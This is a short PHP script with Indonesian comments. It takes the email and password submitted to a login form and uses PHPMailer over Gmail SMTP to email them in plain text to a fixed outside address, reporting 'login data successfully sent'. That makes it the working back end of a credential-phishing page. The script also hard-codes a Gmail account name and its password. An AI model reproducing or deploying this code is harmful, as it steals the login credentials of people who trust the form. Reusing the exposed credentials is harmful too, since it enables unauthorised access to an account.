<?php
// Include PHPMailer library
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php'; // Pastikan Anda sudah menginstal PHPMailer melalui Composer

// Buat objek PHPMailer
$mail = new PHPMailer(true);

try {
    // Konfigurasi server email SMTP
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';       // Setel server SMTP
    $mail->SMTPAuth   = true;
    $mail->Username   = 'comod2212@gmail.com';  // Email pengirim
    $mail->Password   = 'Akunbuat2212';         // Kata sandi email pengirim
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Enkripsi TLS
    $mail->Port       = 587;                    // Port SMTP Gmail

    // Informasi pengirim dan penerima
    $mail->setFrom('comod2212@gmail.com', 'Login System');  // Dari siapa email dikirim
    $mail->addAddress('akanginfo20@gmail.com', 'Akang Info'); // Email penerima

    // Ambil data dari form login
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Buat isi email
    $mail->isHTML(true);
    $mail->Subject = 'Login Data';
    $mail->Body    = 'Email: ' . $email . '<br>Password: ' . $password;

    // Kirim email
    $mail->send();
    echo 'Data login berhasil dikirim ke email!';
} catch (Exception $e) {
    echo "Gagal mengirim email. Error: {$mail->ErrorInfo}";
}
?>